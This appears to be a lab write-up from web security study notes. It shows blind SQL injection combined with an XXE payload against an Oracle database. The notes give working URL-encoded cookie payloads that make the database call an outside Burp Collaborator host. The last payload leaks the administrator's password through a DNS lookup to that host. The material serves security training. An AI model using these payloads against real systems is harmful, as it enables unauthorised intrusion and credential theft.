We can combine SQL with an XXE payload:
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

And this will perform a OAST technique to our Burp Collaborator server. This is because we know it's an Oracle database.
![](imgs/blind_oast_exfiltration_with_xxe.png)

We can see the requests performed:
![](imgs/blind_oast_exfiltration_with_xxe-1.png)

Here is an advanced lab that covers data exfiltration with the following payload:
`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`

Here we just add the query as a subdomain, so the DNS request made to our server leaks the content of the query:
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
![](imgs/blind_oast_exfiltration_with_xxe-2.png)

We can see the password as a DNS request:
![](imgs/blind_oast_exfiltration_with_xxe-3.png)

![](imgs/blind_oast_exfiltration_with_xxe-4.png)